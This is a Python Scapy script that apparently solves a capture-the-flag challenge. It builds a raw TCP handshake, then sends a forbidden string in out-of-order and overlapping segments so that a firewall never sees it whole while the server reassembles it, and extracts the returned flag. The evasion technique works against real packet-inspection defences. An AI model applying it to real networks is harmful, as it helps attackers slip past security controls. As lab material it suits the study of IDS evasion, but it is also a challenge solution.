#!/usr/bin/env python3
from scapy.all import (
    Ether, IP, TCP, Raw,
    sendp, sniff, conf, getmacbyip
)
import random, re, time

DST_IP   = "10.123.45.3"
DST_PORT = 1337
SRC_PORT = 12345

def main():
    conf.verb = 0

    # Find the correct outgoing interface toward the docker network
    iface, src_ip, _ = conf.route.route(DST_IP)

    dst_mac = getmacbyip(DST_IP)
    if not dst_mac:
        print(f"[!] Could not resolve MAC for {DST_IP}. iface={iface}")
        return

    eth = Ether(dst=dst_mac)
    ip  = IP(src=src_ip, dst=DST_IP)

    # -------------------------
    # 1) TCP 3-way handshake (Scapy)
    # -------------------------
    seq0 = random.randint(100000, 2000000000)

    syn = eth / ip / TCP(sport=SRC_PORT, dport=DST_PORT, flags="S", seq=seq0)
    sendp(syn, iface=iface)

    synack_pkts = sniff(
        iface=iface,
        timeout=2,
        count=1,
        lfilter=lambda p: p.haslayer(TCP) and p.haslayer(IP)
            and p[IP].src == DST_IP
            and p[TCP].sport == DST_PORT
            and p[TCP].dport == SRC_PORT
            and (p[TCP].flags & 0x12) == 0x12  # SYN+ACK
    )
    if not synack_pkts:
        print("[!] Handshake failed: no SYN-ACK")
        return

    synack = synack_pkts[0]
    srv_seq = synack[TCP].seq

    ack_no  = srv_seq + 1
    base_seq = seq0 + 1

    ack = eth / ip / TCP(sport=SRC_PORT, dport=DST_PORT, flags="A",
                         seq=base_seq, ack=ack_no)
    sendp(ack, iface=iface)

    # -------------------------
    # 2) Out-of-order + overlap trick
    # Goal: server reassembles stream to "GIMME_FLAG"
    # while firewall doesn't see "GIMME_FLAG" in any single packet.
    #
    # We'll do:
    #  - Send "FLAG" first (out-of-order) at seq base+6
    #  - Send "GIMME_" later at seq base
    #  - Additionally send an overlapping segment that overwrites part
    #    of the stream but still never contains full "GIMME_FLAG" in one payload.
    # -------------------------
    part1 = b"GIMME_"
    part2 = b"FLAG"

    # Out-of-order: second part first
    p2 = eth / ip / TCP(sport=SRC_PORT, dport=DST_PORT, flags="PA",
                        seq=base_seq + len(part1), ack=ack_no) / Raw(part2)
    sendp(p2, iface=iface)

    # Now first part
    p1 = eth / ip / TCP(sport=SRC_PORT, dport=DST_PORT, flags="PA",
                        seq=base_seq, ack=ack_no) / Raw(part1)
    sendp(p1, iface=iface)

    # Optional small overlap (doesn't include full forbidden string in one packet)
    # overlaps last byte of "GIMME_" and first byte of "FLAG"
    ov = eth / ip / TCP(sport=SRC_PORT, dport=DST_PORT, flags="PA",
                        seq=base_seq + 5, ack=ack_no) / Raw(b"_F")
    sendp(ov, iface=iface)

    # -------------------------
    # 3) Sniff server reply and extract flag
    # -------------------------
    pkts = sniff(
        iface=iface,
        timeout=3,
        lfilter=lambda p: p.haslayer(TCP) and p.haslayer(Raw) and p.haslayer(IP)
            and p[IP].src == DST_IP
            and p[TCP].sport == DST_PORT
            and p[TCP].dport == SRC_PORT
    )

    data = b"".join(p[Raw].load for p in pkts if p.haslayer(Raw))
    m = re.search(rb"CTF\{[^}]+\}", data)
    if m:
        flag = m.group(0).decode()
        print(flag)

        # Save flag to file
        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")
    else:
        print("No flag found. Reply was:")
        print(data.decode(errors="replace"))


if __name__ == "__main__":
    main()
